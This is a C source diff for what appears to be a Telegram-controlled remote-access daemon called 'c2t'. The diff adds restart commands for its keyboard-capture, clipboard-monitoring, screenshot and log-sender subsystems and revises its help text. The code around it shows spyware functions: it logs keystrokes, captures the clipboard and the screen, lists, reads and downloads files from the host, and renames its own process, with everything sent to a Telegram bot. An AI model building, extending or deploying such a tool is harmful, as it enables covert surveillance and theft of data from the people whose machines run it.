@@ -206,13 +206,19 @@ typedef enum {
   CMD_SCREENSHOT_STATUS,
   CMD_SCREENSHOT_HELP,
   CMD_PROCESS_NAME,
+  CMD_RESTART,
+  CMD_RESTART_KEYBOARD,
+  CMD_RESTART_CLIPBOARD,
+  CMD_RESTART_SCREENSHOT,
+  CMD_RESTART_LOGS,
+  CMD_RESTART_ALL,
   CMD_STATUS,
   CMD_INFO,
   CMD_KILL,
   CMD_HELP
 } c2t_cmd_id_t;
 
-#define CMD_TABLE_SIZE 256U
+#define CMD_TABLE_SIZE 512U
 #define CMD_TABLE_MASK (CMD_TABLE_SIZE - 1U)
 
 typedef struct {
@@ -259,6 +265,12 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"screenshot_status", CMD_SCREENSHOT_STATUS},
   {"screenshot_help", CMD_SCREENSHOT_HELP},
   {"process_name", CMD_PROCESS_NAME}, {"procname", CMD_PROCESS_NAME}, {"rename", CMD_PROCESS_NAME}, {"process", CMD_PROCESS_NAME}, {"setname", CMD_PROCESS_NAME}, {"proc_name", CMD_PROCESS_NAME}, {"process_rename", CMD_PROCESS_NAME},
+  {"restart", CMD_RESTART}, {"reset", CMD_RESTART}, {"reboot", CMD_RESTART}, {"reload", CMD_RESTART}, {"restart_daemon", CMD_RESTART}, {"restart_service", CMD_RESTART}, {"reset_daemon", CMD_RESTART},
+  {"restart_keyboard", CMD_RESTART_KEYBOARD}, {"restart_kb", CMD_RESTART_KEYBOARD}, {"reset_keyboard", CMD_RESTART_KEYBOARD}, {"reset_kb", CMD_RESTART_KEYBOARD},
+  {"restart_clipboard", CMD_RESTART_CLIPBOARD}, {"restart_clip", CMD_RESTART_CLIPBOARD}, {"reset_clipboard", CMD_RESTART_CLIPBOARD}, {"reset_clip", CMD_RESTART_CLIPBOARD},
+  {"restart_screenshot", CMD_RESTART_SCREENSHOT}, {"restart_screen", CMD_RESTART_SCREENSHOT}, {"restart_shot", CMD_RESTART_SCREENSHOT}, {"reset_screenshot", CMD_RESTART_SCREENSHOT}, {"reset_screen", CMD_RESTART_SCREENSHOT}, {"reset_shot", CMD_RESTART_SCREENSHOT},
+  {"restart_logs", CMD_RESTART_LOGS}, {"restart_log", CMD_RESTART_LOGS}, {"reset_logs", CMD_RESTART_LOGS}, {"reset_log", CMD_RESTART_LOGS},
+  {"restart_all", CMD_RESTART_ALL}, {"reset_all", CMD_RESTART_ALL},
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
@@ -738,6 +750,159 @@ int telegram_send_start_info(void) {
   c2t_log_info("telegram", "Startup notification delivery %s",
                ret ? "succeeded" : "failed");
   return ret;
+}
+
+static void restart_subsystem_keyboard(void) {
+  const c2t_config_t *config = c2t_config_get();
+  if (config->disable_keyboard) {
+    telegram_send_html(
+        "⚠️ <b>Keyboard Subsystem Disabled</b>\n<i>Keyboard monitoring is "
+        "disabled in configuration (--no-keyboard).</i>");
+    return;
+  }
+  c2t_log_info("listener", "Restarting keyboard subsystem...");
+  keyboard_listener_cleanup();
+  keyboard_output_cleanup();
+  int out_ok = keyboard_output_init();
+  int list_ok = keyboard_listener_init();
+  char dev_buf[64] = "all";
+  keyboard_get_selected_target(dev_buf, sizeof(dev_buf));
+  char layout[32] = "it";
+  keyboard_get_layout(layout, sizeof(layout));
+  int dev_count = keyboard_get_device_count();
+  char msg[600];
+  snprintf(msg, sizeof(msg),
+           "🔄 <b>Keyboard Subsystem Restarted</b>\n\n"
+           "• <b>Status:</b> %s\n"
+           "• <b>Target:</b> <code>%s</code>\n"
+           "• <b>Layout:</b> <code>%s</code>\n"
+           "• <b>Detected Devices:</b> %d\n\n"
+           "<i>Keyboard listener and delivery worker re-initialized.</i>",
+           (out_ok && list_ok) ? "🟢 <b>ACTIVE</b>"
+                               : "⚠️ <b>WARNING (Partial init)</b>",
+           dev_buf, layout, dev_count);
+  telegram_send_html(msg);
+}
+
+static void restart_subsystem_clipboard(void) {
+  const c2t_config_t *config = c2t_config_get();
+  if (config->disable_clipboard) {
+    telegram_send_html(
+        "⚠️ <b>Clipboard Subsystem Disabled</b>\n<i>Clipboard monitoring is "
+        "disabled in configuration (--no-clipboard).</i>");
+    return;
+  }
+  c2t_log_info("listener", "Restarting clipboard subsystem...");
+  clipboard_output_cleanup();
+  int out_ok = clipboard_output_init();
+  clipboard_set_paused(0);
+  char msg[512];
+  snprintf(msg, sizeof(msg),
+           "🔄 <b>Clipboard Subsystem Restarted</b>\n\n"
+           "• <b>Status:</b> %s\n"
+           "• <b>Buffer:</b> Clean / Reset\n\n"
+           "<i>Clipboard delivery worker has been re-initialized and resumed.</i>",
+           out_ok ? "🟢 <b>ACTIVE</b>" : "⚠️ <b>ERROR</b>");
+  telegram_send_html(msg);
+}
+
+static void restart_subsystem_screenshot(void) {
+  const c2t_config_t *config = c2t_config_get();
+  if (config->disable_screenshot) {
+    telegram_send_html(
+        "⚠️ <b>Screenshot Subsystem Disabled</b>\n<i>Screenshot functionality "
+        "is disabled in configuration (--no-screenshot).</i>");
+    return;
+  }
+  c2t_log_info("listener", "Restarting screenshot subsystem...");
+  screenshot_output_cleanup();
+  int ok = screenshot_output_init();
+  screenshot_set_paused(0);
+  char cur_target[64] = "all";
+  screenshot_get_selected_display(cur_target, sizeof(cur_target));
+  size_t interval = screenshot_get_interval();
+  char msg[600];
+  snprintf(msg, sizeof(msg),
+           "🔄 <b>Screenshot Subsystem Restarted</b>\n\n"
+           "• <b>Status:</b> %s\n"
+           "• <b>Backend:</b> <code>%s</code>\n"
+           "• <b>Detected Displays:</b> %d (Target: <code>%s</code>)\n"
+           "• <b>Timer:</b> %llu s\n\n"
+           "<i>Screenshot backend, capture buffers, and workers re-initialized.</i>",
+           ok ? "🟢 <b>ACTIVE</b>" : "⚠️ <b>ERROR</b>",
+           screenshot_get_backend_name(), screenshot_get_display_count(),
+           cur_target, (unsigned long long)interval);
+  telegram_send_html(msg);
+}
+
+static void restart_subsystem_logs(void) {
+  c2t_log_info("listener", "Restarting log sender subsystem...");
+  c2t_log_sender_cleanup();
+  int ok = c2t_log_sender_init();
+  char msg[512];
+  snprintf(msg, sizeof(msg),
+           "🔄 <b>Log Sender Subsystem Restarted</b>\n\n"
+           "• <b>Status:</b> %s\n\n"
+           "<i>Log queue flushed and dispatch worker re-initialized.</i>",
+           ok ? "🟢 <b>ACTIVE</b>" : "⚪ <b>STANDBY (On-demand only)</b>");
+  telegram_send_html(msg);
+}
+
+static void restart_subsystem_all(void) {
+  const c2t_config_t *config = c2t_config_get();
+  c2t_log_info("listener", "Restarting all subsystems in-place...");
+  if (!config->disable_keyboard) {
+    keyboard_listener_cleanup();
+    keyboard_output_cleanup();
+    (void)keyboard_output_init();
+    (void)keyboard_listener_init();
+  }
+  if (!config->disable_clipboard) {
+    clipboard_output_cleanup();
+    (void)clipboard_output_init();
+    clipboard_set_paused(0);
+  }
+  if (!config->disable_screenshot) {
+    screenshot_output_cleanup();
+    (void)screenshot_output_init();
+    screenshot_set_paused(0);
+  }
+  c2t_log_sender_cleanup();
+  (void)c2t_log_sender_init();
+
+  char msg[768];
+  snprintf(
+      msg, sizeof(msg),
+      "🔄 <b>All Subsystems Reset &amp; Restarted</b>\n\n"
+      "• 📋 <b>Clipboard:</b> %s\n"
+      "• ⌨️ <b>Keyboard:</b> %s\n"
+      "• 📸 <b>Screenshots:</b> %s\n"
+      "• 📜 <b>Log Sender:</b> %s\n\n"
+      "<i>All monitoring engines, worker threads, and memory buffers refreshed in-place.</i>",
+      config->disable_clipboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
+      config->disable_keyboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
+      config->disable_screenshot ? "❌ Disabled" : "🟢 Reset &amp; Active",
+      config->telegram_send_logs ? "🟢 Reset &amp; Active"
+                                 : "⚪ Reset &amp; Standby");
+  telegram_send_html(msg);
+}
+
+static void restart_daemon_process(const telegram_incoming_update_t *update) {
+  const c2t_config_t *config = c2t_config_get();
+  c2t_log_warning("listener",
+                  "Complete daemon restart initiated via Telegram command");
+  telegram_send_html(
+      "🔄 <b>c2t Daemon Restarting</b>\n<i>Restarting process in a few "
+      "moments...</i>");
+
+  /* Confirm update offset to Telegram so restart command is not re-executed */
+  if (update && update->update_id > 0 && config->telegram_bot_token) {
+    int64_t ack_offset = update->update_id + 1;
+    (void)telegram_poll_updates_callback(config->telegram_bot_token,
+                                         &ack_offset, 0, nullptr, nullptr);
+  }
+
+  (void)c2t_runtime_trigger_restart();
 }
 
 static void handle_command(const telegram_incoming_update_t *update,
@@ -1780,6 +1945,72 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_RESTART: {
+    const char *arg = get_command_argument(text);
+    while (*arg && isspace((unsigned char)*arg))
+      arg++;
+    if (match_command(arg, "keyboard") || match_command(arg, "kb") ||
+        match_command(arg, "keys")) {
+      restart_subsystem_keyboard();
+    } else if (match_command(arg, "clipboard") || match_command(arg, "clip")) {
+      restart_subsystem_clipboard();
+    } else if (match_command(arg, "screenshot") ||
+               match_command(arg, "screen") || match_command(arg, "screens") ||
+               match_command(arg, "shot")) {
+      restart_subsystem_screenshot();
+    } else if (match_command(arg, "logs") || match_command(arg, "log")) {
+      restart_subsystem_logs();
+    } else if (match_command(arg, "all")) {
+      restart_subsystem_all();
+    } else if (!*arg || match_command(arg, "daemon") ||
+               match_command(arg, "service") || match_command(arg, "process") ||
+               match_command(arg, "c2t")) {
+      restart_daemon_process(update);
+    } else {
+      telegram_send_html(
+          "⚠️ <b>Usage:</b> <code>/restart [subsystem|all|daemon]</code>\n\n"
+          "<b>Supported targets:</b>\n"
+          "• <code>/restart keyboard</code> (or <code>/restart_kb</code>) - "
+          "Restart keyboard listener &amp; worker\n"
+          "• <code>/restart clipboard</code> (or <code>/restart_clip</code>) - "
+          "Restart clipboard monitor\n"
+          "• <code>/restart screenshot</code> (or <code>/restart_shot</code>) - "
+          "Restart screenshot backend &amp; timer\n"
+          "• <code>/restart logs</code> (or <code>/restart_logs</code>) - "
+          "Flush and restart log sender\n"
+          "• <code>/restart all</code> (or <code>/restart_all</code>) - Reset "
+          "all subsystems in-place\n"
+          "• <code>/restart daemon</code> (or <code>/restart</code>, "
+          "<code>/reboot</code>) - Full process restart");
+    }
+    break;
+  }
+
+  case CMD_RESTART_KEYBOARD: {
+    restart_subsystem_keyboard();
+    break;
+  }
+
+  case CMD_RESTART_CLIPBOARD: {
+    restart_subsystem_clipboard();
+    break;
+  }
+
+  case CMD_RESTART_SCREENSHOT: {
+    restart_subsystem_screenshot();
+    break;
+  }
+
+  case CMD_RESTART_LOGS: {
+    restart_subsystem_logs();
+    break;
+  }
+
+  case CMD_RESTART_ALL: {
+    restart_subsystem_all();
+    break;
+  }
+
   case CMD_KILL: {
     c2t_log_warning(
         "listener",
@@ -1810,6 +2041,7 @@ static void handle_command(const telegram_incoming_update_t *update,
         "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
         "• <code>/status</code> - View daemon status &amp; throughput state\n"
         "• <code>/process_name [name]</code> (or <code>/rename</code>, <code>/procname</code>) - View or change process name\n"
+        "• <code>/restart [subsystem|all|daemon]</code> (or <code>/reset</code>, <code>/reboot</code>) - Restart subsystems or full daemon\n"
         "• <code>/logs</code> - Flush and retrieve execution logs\n"
         "• <code>/pause</code> - Pause all active monitoring\n"
         "• <code>/resume</code> - Resume all active monitoring\n"
@@ -1862,35 +2094,52 @@ static void handle_command(const telegram_incoming_update_t *update,
     if (!config->disable_screenshot) {
       static const char shot_sec[] =
           "<b>Screenshot Controls:</b>\n"
-          "• <code>/screenshot [id|all]</code> (or <code>/shot</code>) - Capture &amp; send screenshot now\n"
-          "• <code>/screenshot_displays</code> - List detected displays\n"
-          "• <code>/screenshot_select &lt;id|all&gt;</code> - Select the default display\n"
-          "• <code>/screenshot_format &lt;fmt&gt;</code> - Set format (png, jpg, bmp, plain, tga, hdr)\n"
-          "• <code>/screenshot_quality &lt;1-100&gt;</code> - Set compression quality\n"
-          "• <code>/screenshot_timer &lt;sec&gt;</code> - Set periodic capture timer (0 to disable)\n"
-          "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - Enable / mute captures\n"
+          "• <code>/screenshot [id|all]</code> (or <code>/shot</code>) - Capture "
+          "&amp; send desktop screenshot\n"
+          "• <code>/screenshot_displays</code> (or <code>/screens</code>) - "
+          "List detected displays &amp; active target\n"
+          "• <code>/screenshot_select &lt;id|all&gt;</code> - Select default "
+          "monitor to capture\n"
+          "• <code>/screenshot_format &lt;png|jpg|bmp|plain|tga|hdr&gt;</code> "
+          "- Set image format\n"
+          "• <code>/screenshot_quality &lt;1-100&gt;</code> - Set compression "
+          "quality (default: 85%)\n"
+          "• <code>/screenshot_timer &lt;sec&gt;</code> - Configure periodic "
+          "capture timer\n"
+          "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - "
+          "Resume / pause captures\n"
           "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
-          "• <code>/screenshot_status</code> - View screenshot monitor status\n"
-          "• <code>/screenshot_help</code> - Show full screenshot commands guide\n\n";
+          "• <code>/screenshot_status</code> - View screenshot monitor "
+          "status\n"
+          "• <code>/screenshot_help</code> - Show full screenshot commands "
+          "guide\n\n";
       if (h_off + sizeof(shot_sec) - 1 < sizeof(help_msg)) {
         memcpy(help_msg + h_off, shot_sec, sizeof(shot_sec) - 1);
         h_off += sizeof(shot_sec) - 1;
       }
     }
 
-    static const char file_sec[] =
-        "<b>File Management:</b>\n"
-        "• <code>/getfile &lt;path&gt;</code> - Retrieve &amp; send file from "
-        "host\n"
-        "• <code>/upload [path]</code> - Instructions for uploading files to "
-        "host\n"
-        "• <code>/ls [path]</code> - List directory contents\n"
-        "• <code>/cat &lt;path&gt;</code> - View text file contents\n"
-        "• <code>/fileinfo &lt;path&gt;</code> - View file or directory "
-        "metadata";
-    if (h_off + sizeof(file_sec) - 1 < sizeof(help_msg)) {
-      memcpy(help_msg + h_off, file_sec, sizeof(file_sec) - 1);
-      h_off += sizeof(file_sec) - 1;
+    if (config->telegram_send_files) {
+      static const char file_sec[] =
+          "<b>File Operations:</b>\n"
+          "• <code>/ls [path]</code> - List directory contents\n"
+          "• <code>/cat &lt;file_path&gt;</code> - View text file preview\n"
+          "• <code>/getfile &lt;file_path&gt;</code> - Download file from "
+          "host\n"
+          "• <code>/fileinfo &lt;path&gt;</code> - Query file/dir metadata\n"
+          "• <code>/upload</code> - Instructions to upload files to host\n\n";
+      if (h_off + sizeof(file_sec) - 1 < sizeof(help_msg)) {
+        memcpy(help_msg + h_off, file_sec, sizeof(file_sec) - 1);
+        h_off += sizeof(file_sec) - 1;
+      }
+    }
+
+    static const char help_tail[] =
+        "💡 <i>Tip: Commands also accept dash syntax (e.g. "
+        "<code>/keyboard-shortcuts off</code> or <code>/screenshot-format jpg</code>)</i>";
+    if (h_off + sizeof(help_tail) - 1 < sizeof(help_msg)) {
+      memcpy(help_msg + h_off, help_tail, sizeof(help_tail) - 1);
+      h_off += sizeof(help_tail) - 1;
     }
     help_msg[h_off] = '\0';
     telegram_send_html(help_msg);
@@ -1930,18 +2179,6 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
     return;
   }
 
-  /* Discard any stale updates sent before this daemon instance started */
-  if (update->date > 0 && listener_start_time > 0 &&
-      update->date < listener_start_time - 3) {
-    c2t_log_info(
-        "listener",
-        "Ignoring stale update #%lld (%s) sent before daemon startup (msg_date=%lld, start_time=%lld)",
-        (long long)update->update_id,
-        update->text ? update->text : (update->file_id ? "file" : "update"),
-        (long long)update->date, (long long)listener_start_time);
-    return;
-  }
-
   /* If incoming update has an attached file/document/photo */
   if (update->file_id && *update->file_id) {
     c2t_log_info(
@@ -1953,9 +2190,16 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
     return;
   }
 
-  /* Handle text command */
-  if (update->text && *update->text) {
-    handle_command(update, chat_id,
+  /* Handle text or caption command */
+  const char *cmd_text = (update->text && *update->text)
+                             ? update->text
+                             : (update->caption && *update->caption
+                                    ? update->caption
+                                    : nullptr);
+  if (cmd_text && *cmd_text) {
+    telegram_incoming_update_t eff_update = *update;
+    eff_update.text = cmd_text;
+    handle_command(&eff_update, chat_id,
                    update->username ? update->username : "");
   }
 }
